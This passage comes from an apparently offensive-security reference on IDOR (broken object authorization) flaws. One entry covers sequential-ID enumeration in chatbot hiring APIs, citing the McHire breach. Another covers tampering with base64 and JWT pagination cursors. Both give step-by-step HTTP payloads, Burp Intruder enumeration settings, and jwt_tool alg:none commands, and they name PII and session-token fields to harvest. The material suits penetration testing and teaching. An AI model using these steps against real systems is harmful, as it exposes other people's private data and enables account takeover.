**Escalation:** Horizontal
**Business impact:** Mass exfiltration of AI conversation transcripts, applicant PII, and session tokens. Real-world case: McHire chatbot (Paradox.ai, used by McDonald's) — June 2025, 64 million job applicant records exposed by decrementing a single `lead_id` integer. Full names, contact details, chat transcripts, and session tokens retrieved per request with no ownership check.
**Test payload:**
```http
# Step 1: Intercept traffic from any AI chatbot interaction
# Use Burp Suite proxy — look for API calls with sequential numeric IDs in the chatbot flow

# Common endpoint patterns in AI chatbot platforms:
GET /api/lead/cem-xhr?lead_id=88291 HTTP/1.1
Cookie: <session from chatbot interaction>
→ Returns full PII and transcript for lead 88291

# Step 2: Decrement/increment the ID — no ownership check:
GET /api/lead/cem-xhr?lead_id=88290 HTTP/1.1
Cookie: <same session>
→ Full chat transcript, name, email, phone, session token of a different applicant

# Step 3: Automate enumeration with Burp Intruder:
# Payload type: Numbers
# From: your_lead_id - 1000; To: your_lead_id + 1000; Step: 1
# Grep for: "email", "phone", "name", "session_token", "transcript"

# Common chatbot platform endpoint patterns to look for in Burp history:
GET /api/sessions/{session_id}/messages
GET /api/conversations/{id}/history
POST /api/chat/sessions/{id}/details
GET /api/applicants/{lead_id}/data
GET /v1/leads/{id}
GET /api/candidates/{id}/conversation

# Detection signals for vulnerable chatbot APIs:
# - Sequential numeric IDs visible in any chatbot-related XHR request
# - Powered-by headers: Paradox, Intercom, Drift, Ada, Kore.ai, Liveperson
# - Subdomains: hire.company.com, chat.company.com, support.company.com
# - Session tokens exposed in conversation API responses (escalate to ATO)
# - /api/ or /internal/ routes called by the chatbot frontend JS bundle
```
**Source:** https://www.bitdefender.com/en-gb/blog/hotforsecurity/mchire-mcdonalds-chatbot-64-million; https://research.cgu.edu/icdc/2025/07/01/mcdonalds-july-2025-breach/

---

## IDOR via Cursor / Pagination Token Manipulation
**Reference type:** Encoded token (base64, JWT, opaque string)
**API pattern:** REST (cursor-based pagination)
**Authorization flaw:** Cursor-paginated APIs encode pagination context (last-seen object ID, user scope, timestamp anchor) into an opaque token passed as `cursor`, `page_token`, `after`, or `next_page_token`. The server trusts the cursor's encoded scope without re-validating ownership against the active session. Decoding the cursor, substituting a different user's anchor ID or user scope, and re-encoding returns that user's paginated data as if the server generated the cursor itself.
**Escalation:** Horizontal
**Business impact:** Access to another user's complete paginated data streams — message history, transaction lists, notification feeds, audit logs, search results — by injecting their user ID into the cursor token.
**Test payload:**
```http
# Step 1: Retrieve your own paginated response and extract the cursor:
GET /api/messages?limit=20 HTTP/1.1
Authorization: Bearer <your-token>
→ {
    "messages": [...],
    "cursor": "eyJ1c2VySWQiOiAxMDAxLCAibGFzdElkIjogNTAwfQ=="
  }

# Step 2: Decode the cursor (base64):
echo "eyJ1c2VySWQiOiAxMDAxLCAibGFzdElkIjogNTAwfQ==" | base64 -d
→ {"userId": 1001, "lastId": 500}

# Step 3: Modify the userId, re-encode:
echo -n '{"userId": 1002, "lastId": 1}' | base64
→ eyJ1c2VySWQiOiAxMDAyLCAibGFzdElkIjogMX0=

# Step 4: Submit the modified cursor — receives victim's paginated data:
GET /api/messages?limit=20&cursor=eyJ1c2VySWQiOiAxMDAyLCAibGFzdElkIjogMX0= HTTP/1.1
Authorization: Bearer <your-token>
→ Returns user 1002's messages from page 1 (full history accessible by iterating cursor)

# JWT-encoded cursors — decode middle section, modify scope, re-sign or use alg:none:
python3 jwt_tool.py <cursor_token> -T   # tamper mode
python3 jwt_tool.py <cursor_token> -X a  # alg:none attack

# Common pagination parameter names to test:
# cursor, after, before, page_token, next_page_token, continuation_token,
# offset_token, scroll_id (Elasticsearch), resume_token (MongoDB changestream),
# pageInfo.endCursor (GraphQL Relay pagination)

# GraphQL Relay pagination IDOR:
query {
  messages(first: 20, after: "<base64-modify-userId>") {
    edges { node { content } }
    pageInfo { endCursor hasNextPage }
  }
}

# Elasticsearch scroll IDOR — reuse another session's scroll context:
GET /api/search/scroll HTTP/1.1
{"scroll": "1m", "scroll_id": "<scroll_id_from_another_user_session>"}
→ Continues victim's search session, returns their scoped results
```
**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References
